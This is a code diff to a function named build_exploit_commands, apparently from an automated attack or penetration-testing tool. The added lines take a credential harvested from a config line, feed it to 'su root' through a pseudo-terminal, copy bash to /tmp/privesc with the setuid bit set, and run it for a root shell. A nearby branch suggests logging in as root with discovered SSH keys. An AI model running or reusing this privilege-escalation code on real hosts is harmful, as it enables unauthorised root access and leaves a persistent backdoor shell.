@@ -259,6 +259,12 @@ def build_exploit_commands(action: Action, state: HostState) -> List[str]:
                 # Try to extract the value after = 
                 value = cred_line.split("=", 1)[-1].strip().strip("'\"").strip()
                 if value and len(value) > 2:
+                    py_cmd = (
+                        f"python3 -c 'import os,pty,time;pid,fd=pty.fork();"
+                        f"os.execlp(\"su\",\"su\",\"root\",\"-c\",\"cp /bin/bash /tmp/privesc && chmod +s /tmp/privesc\")"
+                        f" if pid==0 else [time.sleep(0.5),os.write(fd,b\"{value}\\n\"),time.sleep(0.5)]'"
+                    )
+                    cmds.append(f"{py_cmd} 2>/dev/null && /tmp/privesc -p -c id 2>/dev/null")
                     cmds.append(f"echo '{value}' | su - root 2>/dev/null")
             elif "ssh" in lower and ("key" in lower or "id_rsa" in lower):
                 cmds.append("# SSH key found — try: ssh -i <key_path> root@localhost")
